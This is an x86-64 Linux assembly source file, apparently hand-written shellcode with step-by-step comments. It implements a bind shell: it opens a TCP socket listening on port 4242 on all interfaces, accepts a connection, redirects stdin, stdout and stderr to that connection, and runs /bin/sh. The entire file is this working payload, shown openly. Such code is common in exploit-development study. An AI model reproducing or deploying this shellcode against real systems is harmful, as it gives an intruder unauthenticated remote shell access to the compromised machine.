section .text
    global _start

_start:
    ; allocate space in the stack
    sub rsp, 16
    xor rax, rax
    mov [rsp], rax
    mov [rsp+8], rax
    ; moving a 2 into the 2 byte space
    mov byte [rsp], 2
    ; setup next 2 byte space
    mov word [rsp+2], 37392
    
    ; socket(2, 1, 0)
    mov al, 41
    mov dil, 2
    mov sil, 1
    ; xor rdx, rdx
    syscall

    ; store return in variable (sockid=r8)
    mov rdi, rax
   
    ; next 4 byte space stays 0, unnecessary
    ; mov [serverAddr+4], rdx

    ; bind (sockid=r8, &serverAddr, 16)
    ; xor rax, rax
    mov al, 49
    ;mov edi, r8d
    mov rsi, rsp
    mov dl, 16
    syscall
  
    ; add rsp, 16

    ; listen(sockid=r8, 2)
    ; xor rax, rax
    mov al, 50
    ;mov edi, r8d ; repeat
    xor rsi, rsi
    mov sil, 2
    syscall

    ; accept(sockid=r8, 0, 0)
    ; xor rax, rax
    mov al, 43
    ;mov edi, r8d ; repeat
    xor rsi, rsi
    ;sub rsi, 2
    xor rdx, rdx
    syscall

    ; store return in variable (clientid = r8)
    mov rdi, rax

    ; dup2(clientid=r8, 0/1/2)
    ;xor rax, rax
    mov al, 33
    ;mov rdi, r8
    xor rsi, rsi
    syscall
    ;xor rax, rax
    mov al, 33
    ;add rsi, 1
    mov sil, 1
    syscall
    ;xor rax, rax
    mov al, 33
    mov sil, 2
    syscall

    ; ensure null terminated string
    xor rax, rax
    push rax
    ; reversed /bin//sh hex encoded
    mov rcx, 0x68732f2f6e69622f
    push rcx

    ; execve ("/bin//sh", 0, 0)
    mov al, 59
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall

    ; exit 0
    ;xor rax, rax
    mov al, 60
    xor rdi, rdi
    syscall


